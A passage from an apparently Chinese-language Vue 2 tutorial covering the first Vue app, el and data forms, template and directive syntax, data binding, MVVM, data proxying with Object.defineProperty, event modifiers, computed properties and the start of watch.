    > ​ 翻译为：您正在开发模式下运行Vue。在为生产部署时，请确保启用生产模式。更多提示请访问：https://vuejs.org/guide/deployment.html
    
    有两种解决方法：
    
    1. 添加一行代码控制输出（频繁 麻烦）
        
        ```js
        Vue.config.productionTip =false;
        ```
        
    2. 修改源码（一劳永逸 推荐）
        
        打开下载的`vue.js文件`，搜索查找以下代码块
        
        ```js
        if (config.productionTip !== false &&typeof console !== 'undefined') {
            // @ts-expect-error
            console[console.info ? 'info' : 'log']("You are running Vue in development mode.\n" + "Make sure to turn on production mode when deploying for production.\n" + "See more tips at https://vuejs.org/guide/deployment.html");
         }
        ```
        
        把它注释掉即可
        

#### 3. 第一个Vue程序

```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title></title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- 2. 引入Vue -->
        <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    </head>
    <body>
        <!-- 1. 准备一个容器 -->
        <div id="app">
            <!-- 原先写死的固定数据 -->
            <!-- hello Vue! -->
            <!-- 4. 插入数据  -->
            {{message}}
        </div>
        <script>
            // 3. 创建Vue实例
            const app=new Vue({
                el: '#app',//el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符
                data: {//data中用于存储数据，数据供el所指定的容器去使用，通常写成对象类型
                    message: 'hello Vue!',
                }
            })
        </script>
        </div>
    </body>
</html>
```

##### 注意：

1. 容器与vue实例保持**一一对应的**关系
    
    > 实际开发中**只有一个**vue实例，并且会配合着组件一起使用
    
2. root 容器里面的代码仍然**符合html规范**，只不过多了一些**特殊的vue语法**，里面的代码被称为【**vue模板**】
    
3. `{{XXX}}` 里面为 **js表达式**（与js代码区分），它可以自动读取到data中的所有属性
    
    > - 表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方
    > - 代码：语句
    
4. 一旦data中的数据发生改变，那么模板中用到该数据的地方也会自动更新
    

```html
<body>
    <!-- 多个元素使用同一个Vue实例 -->
    <div id="app">
        <div>{{ message1 }}</div>
        <!-- 正常渲染：实例1 -->
        <div>{{ code }}</div>
        <!-- 正常渲染：123 -->
    </div>
    <div id="app">
        <div>{{ message1 }}</div>
        <!-- 无法渲染:{{ message1 }} -->
    </div>
    <script>
        // 创建一个Vue实例
        const app = new Vue({
            el: '#app',
            data: {
                message1: '实例1',
                code:123
            }
        });
    </script>
</body>
```

```html
<body>
    <div id="app">
        <!-- 多个Vue实例共享同一个数据源 -->
        <div>{{ message1 }}</div>
        <div>{{ message2 }}</div><!-- 报错 -->
        <div>{{ message3 }}</div><!-- 报错 -->
    </div>
    <script>
        // 创建多个Vue实例
        const app1 = new Vue({
            el: '#app',
            data: {
                message1: '实例1'
            }
        });
        const app2 = new Vue({
            el: '#app',
            data: {
                message2: '实例2'
            }
        });
        const app3 = new Vue({
            el: '#app',
            data: {
                message3: '实例3'
            }
        });
    </script>
</body>
```

##### ⭐**el 与 data 的两种写法**

- 通常情况下 **el** 与 **data** 这两个配置项的一种固定的写法
    
    ```html
    <script>
       // 创建一个实例
       new Vue({
           el: "#root",
           data: {
               name: "XXX"
           }
       })
    </script>
    ```
    
- 除此之外，el 与 data 都分别有另一种写法
    

###### **① el 的第二种写法**

> 在原来代码的基础上将创建的 Vue 实例赋值给一个变量，
> 
> **官方推荐使用 “vm” 当做变量名**

```html
<script>
   // 创建一个实例
   const vm = new Vue({
       // el的第一种写法
       el: "#root",
       data: {
           name: "XXX"
      }
  })
   
   // 在控制台中输出v
   console.log(vm)
   
    // 1.使用$mount指定实例要服务的容器
    vm.$mount("#root")
    // 2.两秒钟后再对容器进行挂载，更加灵活
    setTimeout(()=>{
        vm.$mount('#root')
    },1000)
</script>
```

下图就是 Vue 实例（vm） 的输出结果，输出结果为一个包含许多属性和方法的对象。

这些属性和方法中，有些是**以 `$` 和 `_` 开头**的，它们是 Vue 实例的一部分，用来**操作和控制 Vue 实例的行为**。

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/1a2f02c3b4f9041d6f2f9cee0c2f4464.png#pic_center)

找到 " **[[Prototype]]** " 或者 " **__ proto__** " 的特殊属性，这个属性指向了 **vm 的缔造者，即Vue 的原型对象**

Vue 原型对象是所有 Vue 实例共享的一个公共对象，它包含了所有 Vue 实例都会有的属性和方法。

展开后在众多的方法和属性中找到 " **$mount**" 方法（重要），如上代码，这个方法用于挂载 Vue 实例到 DOM 元素上

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/e308b1f4000d0a4b717a53eff7300ca9.png#pic_center)

###### **② data 的第二种写法**

第一种写法是**对象式**写法，将 data 的值配置为一个**对象**。【`data:{}`】

而第二种写法是**函数式**写法，将 data 定义成一个**函数**，在函数中返回一个对象，这种形式常用在**组件**中。【`data(){}`】

```html
<divid="root">
   <h1>Hello, {{ name }}</h1>
</div>

<script>
   // 创建Vue实例
   new Vue({
       // el的第一种写法
       el: "#root",

       // data的第一种写法：对象式
       //data: {
       //    name :"XXX"
       //}

       // data的第二种写法：函数式
       data() {
          return {
               name: "XXX"
          }
       }
   })
</script>
```

> 注意：
> 
> 1. 在函数式的写法中，**一定要有 return 返回值**，在 return 中再去定义需要的属性
>     
> 2. 使用函数式的时候，一定要用**普通函数**定义，**不能使用箭头函数**去定义，否则会**引发 this 指向的问题**
>     
>     ```html
>     <body>
>         <div id="root">
>             {{name}}
>         </div>
>         <script>
>             // 创建 Vue 实例
>             new Vue({
>                 el: '#root',
>                 // 1. 箭头函数
>                     // data: ()=> {
>                     //     console.log('@@@', this); // 输出：Window 实例对象 [object Window]
>                     //     return {
>                     //         name: '尚硅谷'
>                     //     }
>                     // }
>                 // 2. 普通函数
>                     data: function() {
>                         console.log('@@@', this); // 输出：Vue 实例对象 [object Object]
>                         return {
>                             name: '尚硅谷'
>                         }
>                     }
>             });
>         </script>
>     </body>
>     ```
>     

### 记：Vue —VSCode插件

名称：Vue 3 Snippets—作者：hollowtree

### **1.3.** **模板语法**

#### 1.3.1. 效果

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vue 模板语法案例</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
</head>
<body>
    <div id="app">
        <!-- 绑定文本内容 -->
        <p>{{ message }}</p>
        <!-- 绑定属性 -->
        <a v-bind:href="url">点击我</a>
        <!-- 绑定事件监听器 -->
        <button v-on:click="count += 1">点击次数: {{ count }}</button>
        <!-- 条件渲染 -->
        <p v-if="show">这是一个显示的段落</p>
        <p v-else>这是一个隐藏的段落</p>
        <!-- 列表渲染 -->
        <ul>
            <li v-for="item in items">{{ item }}</li>
        </ul>
        <!-- 循环遍历对象属性 -->
        <ul>
            <li v-for="(value, key, index) in object">{{ index }}. {{ key }}: {{ value }}</li>
        </ul>
    </div>
    <script>
        // 创建 Vue 实例
        const app = new Vue({
            el: '#app',
            data: {
                message: '你好，Vue.js！',
                url: 'https://www.baidu.com',
                count: 0,
                show: true,
                items: ['苹果', '香蕉', '橘子'],
                object: {
                    name: '张三',
                    age: 25,
                    city: '北京'
                }
            }
        });
    </script>
</body>
</html>
```

#### **1.3.2.** **模板的理解**

html 中包含了一些JS 语法代码，语法分为两种，分别为：

1. **插值**语法（双大括号表达式）
    
2. **指令**语法（以v-开头）
    

#### 1.3.3. 插值语法

1. 功能: 用于解析标签体内容
    
2. 语法: `{{xxx}}` ，xxxx 会作为 **js表达式** 解析
    

```html
<body>
    <div id="root">
        你好-{{name}}
    </div>
    <script>
        new Vue({
            el:'#root',
            data:{
                name:'小黄'
            }
        })
    </script>
</body>
```

#### 1.3.4. 指令语法

1. 功能: 解析标签属性、解析标签体内容、绑定事件
    
2. 举例：`v-bind:href = 'xxxx'` ，xxxx 会作为js 表达式被解析
    

```html
<body>
    <div id="root">
        <!-- 两种写法 -->
        <a v-bind:href="url">点击跳转</a>
        <a :href="url">点我也可以跳转</a>

        <!-- 解析标签 -->
        <div x="test">我是测试1号</div><!-- <div x="test">我是测试1号</div> -->
        <!-- 标签属性被解析,在data中找不到会报错;若找到了就解析渲染 -->
        <div :x="no_test">我是测试2号</div><!-- Property or method "test" is not defined on the instance but referenced during render. -->
        <div :x="can_test">我是测试3号</div><!-- <div x="test">我是测试3号</div> -->
    </div>
    <script>
        new Vue({
            el:'#root',
            data:{
                url:'https://baidu.com',
                can_test:'test'
            }
        })
    </script>
</body>
```

3. 说明：Vue 中有有很多的指令，此处只是用v-bind 举个例子

### 1.4. 数据绑定

#### 1.4.1. 效果

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        {{text}}<br>
        单向绑定：<input type="text" :value="name">
        <!-- 页面修改，无法修改data数据 -->

        双向绑定：<input type="text" v-model:value="name">
        <!-- 页面修改，data数据随之修改 -->
        
        
        <!-- 注意可绑定元素 -->
        <h2 v-model="text">你好</h2>
        <!-- 
            [Vue warn]: Error compiling template:

            <h2 v-model="text">: v-model is not supported on this element type. If you are working with contenteditable, it's recommended to wrap a library dedicated for that purpose inside a custom component.

            7  |          页面修改，data数据随之修改
            8  |          
            9  |          <h2 v-model="text">你好</h2>
            |              ^^^^^^^^^^^^^^
            10 |      </div>
         -->
    </div>
       
    <script>
        new Vue({
            el: '#root',
            data: {
                text: '数据绑定',
                name: '尚硅谷'
            }
        })
    </script>
</body>
</html>
```

#### **1.4.2.** **单向数据绑定**

1. 语法：`v-bind:href ="xxx"` 或简写为 `:href`
    
2. 特点：**数据只能从data 流向页面**
    

#### 1.4.3. 双向数据绑定

1. 语法：`v-mode:value="xxx"` 或简写为 `v-model="xxx"`
    
2. 特点：**数据不仅能从data 流向页面，还能从页面流向 data**
    

注意：`v-model`指令主要用于**表单输入元素**，用于实现数据的双向绑定

以下是一些可以与`v-model`绑定的元素类型：

1. **文本框（`<input type="text">`）**：用于单行文本输入
2. **多行文本框（`<textarea>`）**：用于多行文本输入
3. **复选框（`<input type="checkbox">`）**：允许用户选择多个选项
4. **单选按钮（`<input type="radio">`）**：允许用户从一组选项中选择一个
5. **选择框（`<select>`）**：用于下拉菜单，可以选择一个选项
6. **选择框组（`<select multiple>`）**：用于下拉菜单，可以选择多个选项

```html
<body>
    <div id="app">
        <!-- 文本框 -->
        <input type="text" v-model="message1">
        <p>输入的内容是：{{ message1 }}</p>
        <br>

        <!-- 多行文本框 -->
        <textarea v-model="message2"></textarea>
        <p>输入的内容是：{{ message2 }}</p>
        <br>

        <!-- 复选框 -->
        <input type="checkbox" value="选项1" v-model="checkedOptions">
        <label>选项1</label>
        <input type="checkbox" value="选项2" v-model="checkedOptions">
        <label>选项2</label>
        <p>选中的选项是：{{ checkedOptions }}</p>
        <br>

        <!-- 单选按钮 -->
        <input type="radio" value="选项1" v-model="selectedOption">
        <label>选项1</label>
        <input type="radio" value="选项2" v-model="selectedOption">
        <label>选项2</label>
        <p>选中的选项是：{{ selectedOption }}</p>
        <br>

    </div>
    <script>
        // 创建 Vue 实例
        const app = new Vue({
            el: '#app',
            data: {
                message1: 'hello',
                message2: '我在学习vue',
                checkedOptions: [],
                selectedOption: ''
            }
        });
    </script>
</body>
```

### 1.5. MVVM 模型

**M·V·VM（Model-View-ViewModel）**是一种软件设计模式，用于**构建用户界面**。通过数据绑定和双向数据流，使得视图（View）和模型（Model）之间的交互更加直观和易于管理。

Vue 框架就是一个典型的 MVVM 模型的框架

1. M：模型(Model) ：对应data 中的数据
    
2. V：视图(View) ：模板
    
3. ⭐VM：视图模型(ViewModel) ： Vue 实例对象
    

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/bd1882f227a8bf47262d3ac9d136d28f.jpeg#pic_center)

总结：

1. data中所有的属性，最后都出现在了vm身上。
    
2. vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。
    

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="app">
        <h1>{{ title }}</h1>
        <p>{{ message }}</p>
        <!-- 随机挑选两个属性方法，都是可以直接使用的 -->
        <p>$options:  {{$options}}<br></p>
        <p>_c:  {{_c}}</p>
    </div>

    <script>
        // 创建 Vue 实例
        const vm = new Vue({
            el: '#app',
            data: {
                title: 'Vue.js 实例和模板使用案例',
                message: 'Hello, Vue.js!',
            }
        });
        console.log(vm);
    </script>
</body>
</html>
```

##### 数据代理

```js
Object.defineProperty(给哪个对象添加属性,‘添加的属性名’,{配置项})
```

###### ① 给添加属性

1. 直接在对象里面写
    
    ```html
    <script>
        let person = {
            name: '张三',
            gender: '男',
            age: 18
        }
        console.log(person);
    </script>
    ```
    
    ![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/5c6bdf528838bfd100d6e72b6b1f13d7.png#pic_center)
    
2. 通过`Object.defineProperty`
    
    ```html
    <script>
    	let person={
            name:'张三',
            gender:'男'
        }
        Object.defineProperty(person,'age',{
        	value:18
        })
        console.log(person);
    </script>
    ```
    

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/8a9aa20d3f846d76af2b845176ed174f.png#pic_center)

根据控制台的输出结果，我们会发现，图中的两个age颜色不一样，后者明显淡些

原因：**用Object.defineProperty，添加的属性，是不可枚举的**

###### ② 配置项–获取对象属性

同时运行代码 `console.log(Object.keys(person));`

结果：

1. ![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/b963cd9b1e2aa1b8bc6f0479177fe609.png#pic_center)
    
2. ![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/329751aa17151034f2d4fc5eca77aa87.png#pic_center)
    

> ==引入配置项：**enumerable : true**==

```js
……
Object.defineProperty(person, 'age', {
  value: 18,
  enumerable: true // 控制属性是否可以枚举，默认值是 false
});

console.log(person);
console.log(Object.keys(person));
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/8e7f4901ab3871916604e0b335c9a4e6.png#pic_center)

但是，还有问题：**该属性不可修改**

```js
//尝试进行修改
person.age=20
console.log(person.age);//18，修改失败
```

###### ③ 配置项–修改对象属性

> ==引入配置项：**writable:true**==

```js
……
Object.defineProperty(person,'age',{
    value:18,
    enumerable: true,//控制属性是否可以枚举，默认值是false
    writable: true//控制属性是否可以被修改，默认值是false
})
……
person.age=20
console.log(person.age);//20，修改成功
```

###### ④ 配置项–删除对象属性

还有问题：**该属性无法删除**

```js
//尝试进行删除
delete person.age
console.log(person.age);//20，删除失败
```

> ==引入配置项：**configurable:true**==

```js
……
Object.defineProperty(person,'age',{
    value:18,
    enumerable: true,//控制属性是否可以枚举，默认值是false
    writable: true,//控制属性是否可以被修改，默认值是false
    configurable:true//控制属性是否可以被修改，默认值是false
})
……
person.age=20
console.log(person.age);//20，修改成功
……
delete person.age
console.log(person.age);//undefined，删除成功
```

以上，就是基本的三种Object.defineProperty配置项，还有其他很多就不一一列举了

###### ⑤ 对象属性引用问题

在传统的 JavaScript 对象字面量方式中，如果一个属性是从另一个变量获取的值，那么当这个变量的值发生变化时，对象的属性值并不会自动更新

```js
let number = 21;
let person = {
  name: 'shaka',
  sex: '男',
  age: number
};
console.log(person.age); // 21 

number = 22; // 尝试修改number的值
console.log(person); // 21 ，修改失败
```

在这种情况下，尽管修改了 `number` 的值，但 `person` 对象的 `age` 属性值并没有更新；这是因为 `age` 属性直接引用的是 `number` 变量的值，而不是引用 `number` 变量本身

为了解决这个问题，我们可以使用 `Object.defineProperty()` 方法来定义一个具有 getter 和 setter 的属性。这样，当读取或修改这个属性时，getter 和 setter 函数就会被调用，从而允许我们进行额外的逻辑处理

```js
let number = 21;
let person = {
  name: 'shaka',
  sex: '男'
};
Object.defineProperty(person, 'age', {
  get() {
    return number;
  },
  set(value) {
    console.log('有人修改了age属性，且值是', value);
    number = value;
  }
});
console.log(person); // 21
……
person.age = 22; // 修改
console.log(person); // 22 ，修改成功
```

#### 什么是数据代理

> 数据代理就是：通过一个对象代理对另一个对象中属性的操作（读/写）

```js
let obj = {x: 100};
let obj2 = {y: 200};

Object.defineProperty(obj2, 'x', {
  get() {
    return obj.x;
  },
  set(value) {
    obj.x = value;
  }
});

console.log(obj2.x); // 100

obj2.x = 200;
console.log(obj.x); // 200
console.log(obj2.x); // 200
```

- `get` 函数的作用是当 `obj2.x` 被读取时，返回 `obj.x` 的值。
- `set` 函数的作用是当 `obj2.x` 被设置为新值时，将这个新值赋给 `obj.x`。

#### Vue中的数据代理

```html
<body>
    <div id="root">
        <h2>名字：{{name}}</h2>
        <h2>地址：{{address}}</h2>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: '小黄',
                address: '广东广州'
            }
        });
        console.log(vm);
    </script>
</body>
```

在控制台可以看到Vue实例上有**address，name**这两个属性，就是**Object.defineProperty**发挥了作用；

调用是**Object.defineProperty中的get方法**起作用，给属性赋值的时候就是调用了**Object.defineProperty中的set**方法

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/961a06cb05beae59f12e43fbada2a87f.png#pic_center)  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/a70e7a956cad0cadb710eb00e664fd98.png#pic_center)

Vue 中的数据代理是通过 `Object.defineProperty()` 实现的，它允许你通过 Vue 实例（`vm`）来操作数据对象（`data`）中的属性

- 数据访问与代理机制的理解
    
    - 无法直接调用data里面的值
        
    - 可以通过vm._data.name或者vm.name来调用
        

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/a5a6ba84dffffe41e5e491d191ff3e2c.png#pic_center)

#### 数据代理的好处

1. **==更方便的操作 data 中的数据==**：由于数据代理机制，可以在模板中直接使用数据对象中的属性，而不需要通过 `vm._data` 这样的方式来访问
2. **更好的性能**：数据代理允许 Vue 在内部对数据进行更有效的操作，例如在数据变化时自动更新 DOM
3. **更好的封装**：数据代理允许你将数据和视图逻辑分离，使得代码更易于维护和扩展

#### 基本原理

1. **通过 Object.defineProperty() 把 data 对象中所有属性添加到 vm 上**：这意味着 Vue 实例（`vm`）可以代理数据对象（`data`）中的所有属性。
2. **为每一个添加到 vm 上的属性，都指定一个 getter/setter**：当读取或修改这些属性时，Vue 会自动调用相应的 getter/setter 函数。
3. **在 getter/setter 内部去操作（读/写）data 中对应的属性**：这意味着 Vue 可以自动追踪数据的变化，并在需要时更新视图。

### 1.6. 事件处理

#### 1.6.1. 效果

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        <h2>欢迎来到{{name}}学习</h2>
        <button v-on:click="showInfo1('你好')">点我提示信息</button>
        <button v-on:click="showInfo2()">点我提示信息</button>
        <button @click="showInfo3()">点我提示信息</button>
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                name:'尚硅谷',
            },
            methods:{
                showInfo1(text){
                    alert(text)
                },
                showInfo2(){
                    alert('hello')
                },
                showInfo3(){
                    alert('hey~你好')
                }
            }
        })
    </script>
</body>
</html>
```

1. **使用 `v-on:xxx` 或 `@xxx` 绑定事件**：
    - `v-on` 是 Vue 的事件绑定指令，它可以监听 DOM 事件，例如 `v-on:click` 监听点击事件
    - `@` 是 `v-on` 的缩写形式，因此 `@click` 和 `v-on:click` 是等效的
2. **事件的回调需要配置在 `methods` 对象中**：
    - 在 Vue 实例中，你可以通过 `methods` 对象来定义事件处理函数。这些函数作为事件监听器的回调，会在事件触发时执行
3. **methods 中配置的函数，不要使用箭头函数，因为那样会导致`this` 的值不会指向 Vue 实例**
4. **methods 中配置的函数，都是被 Vue 所管理的函数**：
    - 这意味着你可以在这些方法中访问 `this`，并且 `this` 始终指向 Vue 实例vm或组件实例对象
5. **`@click="demo"` 和 `@click="demo($event)"` 效果一致，但后者可以传参**：
    - 当你在模板中绑定事件时，如果事件处理函数不需要传递参数，你可以直接写 `@click="demo"`
    - 如果你需要在事件处理函数中访问原始的 DOM 事件对象，你需要传递 `$event` 作为参数。例如，`@click="demo($event)"`
    - 传递 `$event` 参数可以让你的事件处理函数接收事件对象，这样你就可以在函数内部访问事件的相关属性，例如 `event.target` 或 `event.preventDefault()`

#### **1.6.2.** **绑定监听**

1. `v-on:xxx="fun"`
    
2. `@xxx="fun"`
    
3. `@xxx="fun(参数)"`
    
4. 默认事件形参: `event`
    
5. 隐含属性对象: `$event`
    

#### 1.6.3. 事件修饰符

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
    <style>
        * {
            margin: 20px;
        }
        .box {
            width: 800px;
            height: 80px;
            background-color: pink;
        }
        .box1 {
            width: 800px;
            height: 180px;
            background-color: grey;
        }
        .box2 {
            width: 80px;
            height: 60px;
            background-color: darkolivegreen;
        }
        .list {
            width: 200px;
            height: 200px;
            background-color: orange;
            overflow: auto;
        }
        li {
            height: 100px;
        }
    </style>
</head>
<body>
    <div id="root">
        <h2>欢迎来到{{name}}学习</h2>
        <!-- 1. 阻止默认事件跳转 -->
        <a href="https://baidu.com" @click.prevent="show($event)">点我提示信息</a>
        
        <!-- 2. 阻止事件冒泡（常用） -->
        <div class="box" @click="show()">
            <button @click.stop="show($event)">点我提示信息</button>
        </div>

        <!-- 3. 事件只触发一次 -->
        <button @click.once="show()">点我提示信息（只提示一次，多按无效）</button>
    
        <!-- 4.使用事件的捕获模式  -->
        <div class="box1" @click.capture="showMsg(1)">
            div1
            <div class="box2" @click="showMsg(2)">
                div2
            </div>
        </div>
        
        <!-- 5.只有event.target是当前操作的元素时才触发事件 -->
        <div class="box" @click.self="show()">
            <button @click="show($event)">点我提示信息</button>
        </div>

        <!-- 6. 事件的默认行为立即执行，无需等待事件回调执行完毕 -->
        <!-- 没有添加passive之前，先执行回调函数，再执行默认行为，业务多就会造成页面卡顿（滚动条不动） -->
        <!-- 添加passive之后，先执行默认行为，再执行回调函数 -->
        <!-- 移动端使用较多，不是所有情况都需要这个修饰符 -->
        <ul class="list" @wheel.passive="demo">
            <!-- 滚动事件1：给滚动条添加scroll，滚动条移动就调用 -->
            <!-- 滚动事件2：给鼠标滚轮添加whell，鼠标滚轮动就调用，哪怕滚动条已经到底 -->
            <li>1</li>
            <li>2</li>
            <li>3</li>
            <li>4</li>
            <li>5</li>
        </ul>
    </div>
       
    <script>
        new Vue({
            el: '#root',
            data: {
                name:'尚硅谷'
            },
            methods:{
                show(e){
                    // 1. 阻止默认事件跳转
                    // e.preventDefault()
                    alert('你好')
                },
                showMsg(msg){
                    alert(msg)
                },
                demo(){
                    console.log('滚动');
                    for(let i=0;i<10000;i++){
                        console.log(1);
                    }
                    console.log('累坏了');
                }
            }
        })
    </script>
</body>
</html>
```

1. `.prevent`
    
    - 使用 `.prevent` 修饰符可以阻止事件的默认行为，相当于`event.preventDefault()`
        
    - 点击链接时默认会跳转到链接地址，但添加 `.prevent` 后可以阻止这个行为
        
2. `.stop`
    
    - 使用 `.stop` 修饰符可以阻止事件冒泡，相当于`event.stopPropagation()`
        
    - 例如，点击按钮时，如果按钮在 `div` 中，默认会触发 `div` 的点击事件，但添加 `.stop` 后只会触发按钮的点击事件
        
3. `.once`
    
    - 使用 `.once` 修饰符可以使事件只触发一次
    - 例如，按钮点击事件默认会一直触发，但添加 `.once` 后只会触发一次
4. `.capture`
    
    - 使用 `.capture` 修饰符可以使事件在捕获阶段触发
        
    - 例如，点击 `div1` 时，默认会先触发 `div2` 的点击事件，但添加 `.capture` 后会先触发 `div1` 的点击事件
        
5. `.self`
    
    - 使用 `.self` 修饰符可以使事件只有当事件目标是当前元素时才触发
    - 例如，点击 `div` 中的按钮时，默认会触发 `div` 的点击事件，但添加 `.self` 后只会触发按钮的点击事件
6. `.passive`
    
    - 使用 `.passive` 修饰符可以使事件的默认行为立即执行，无需等待事件回调执行完毕
        
    - 例如，滚动事件默认会先执行回调函数，再执行默认行为，但添加 `.passive` 后会先执行默认行为，再执行回调函数
        

#### 1.6.4. 按键修饰符

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        <h2>欢迎来到{{name}}学习</h2>
        <input type="text" placeholder="输入提示按下的键以及键值" @keydown="show">
        <input type="text" placeholder="按下回车提示输入" @keydown.enter="showInfo">
    </div>
</body>

<script>
    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷'
        },
        methods: {
            show(e){
                console.log(e.key,e.keyCode);
            },
            showInfo(e){
                console.log(e.target.value)
            }
        },
    })
</script>
</html>

```

1. **keycode** : 操作的是某个keycode 值的键（不推荐使用）
    
2. .keyName : 操作的某个按键名的键(少部分)【`keyName` 修饰符是 Vue 1.x 版本的写法，现在已经不再推荐使用】
    
    **key**：检查事件对象中的 `key` 属性【`key` 修饰符是 Vue.js 2.2.0 版本引入的，用于更准确地绑定键盘事件】
    
3. 一些常见的 `key` 值和它们对应的按键名：
    
    - `Enter`：回车键
    - `Tab`：制表键（特殊，必须配合keydown使用）
    - `Esc`：ESC 键
    - `Space`：空格键
    - `Up`：上方向键
    - `Down`：下方向键
    - `Left`：左方向键
    - `Right`：右方向键
4. 未提供别名的按键，可以使用按键原始的key值去绑定
    
5. 如果键名由**多个单词**组成，你需要使用连字符（`-`）来分隔这些单词；例如，如果你想监听 `CapsLock` 键，你需要使用 `Caps-Lock` 作为键名
    
6. 系统修饰键(用法特殊)：`ctrl`、`alt`、`shift`、`meta`（Win）
    
    (1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发
    
    (2).配合keydown使用：正常触发事件
    
7. Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
    
8. **修饰符可以连用**
    

### 1.7. 计算属性与监视

#### 1.7.1. 效果

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        姓：<input type="text" v-model="xing">
        名：<input type="text" v-model="ming">
        <!-- 1.  -->
        <!-- 姓名：<span>{{xing}}{{ming}}</span> -->
        <!-- 2.  -->
        <!-- 姓名：<span>{{fullname()}}</span> -->
        <!-- 3.  -->
        姓名：<span>{{name}}</span>
    </div>
    <!-- 1. 插值语法实现 -->
    <!-- <script>
        const vm=new Vue({
            el:'#root',
            data:{
                xing:'',
                ming:'',
                name:''
            },
            methods:{
                show(){
                    console.log(1);
                }
            }
        })
    </script> -->
    <!-- 2. methods实现 -->
    <!-- <script>
        const vm=new Vue({
            el:'#root',
            data:{
                xing:'',
                ming:''
            },
            methods:{
                fullname(){
                    return this.xing+this.ming
                }
            }
        })
    </script> -->
    <!-- 3.计算属性实现 -->
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                xing:'',
                ming:'',
            },
            methods:{
            },
            computed:{
                // 1. 完整写法
                // name:{
                //     get(){
                //         return this.xing+this.ming
                //     },
                //     // set(value){
                //     //     const [xing, ming] = value.split('');
                //     //     this.xing = xing;
                //     //     this.ming = ming;
                //     // }
                // }
                // 2.简写
                name:function(){
                    return this.xing+this.ming
                }
            }
        })
    </script>
</body>
</html>
```

#### **1.7.2.** **计算属性-computed**

1. 要显示的数据不存在，要通过计算得来。
    
2. 在computed 对象中定义计算属性。
    
3. 在页面中使用{{方法名}}来显示计算的结果。
    

#### 1.7.3. 监视属性-watch

案例：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <!-- <h2>今天天气很不错</h2> -->
        <button @click="change()">点击切换天气</button>
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                isHot:true
            },
            methods:{
                change(){
                    this.isHot=!this.isHot
                }
            },
            computed:{
                info:function(){
                    return this.isHot?'炎热':'凉爽'
                }
            }
        })
    </script>
</body>
</html>
```

> （一个小bug）假设，页面中不使用插值语法展示数据，那么点击按钮，数据isHot发生变化了但在开发者工具中不显示，但通过控制台输入却能查看到数据已改变

```html
<body>
    <div id="root">
        <h2>今天天气很{{ info }}</h2>
        <!-- <h2>今天天气很不错</h2> -->
        <button @click="change()">点击切换天气</button>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true
            },
            methods: {
                change() {
                    this.isHot = !this.isHot;
                }
            },
            computed: {
                info() {
                    return this.isHot ? '炎热' : '凉爽';
                }
            },
        // 1.写法一
            // watch: {
            //     isHot: {
            //         immediate:true,//初始化时，让handler调用一下
            //         handler(newValue, oldValue) {
            //             console.log(`天气从${oldValue?"炎热":"凉爽"}变成了${newValue?"炎热":"凉爽"}`);
            //         }
            //     }
            // }
        })
        // 2.写法二
        const unwatch = vm.$watch('isHot', function(newValue, oldValue) {
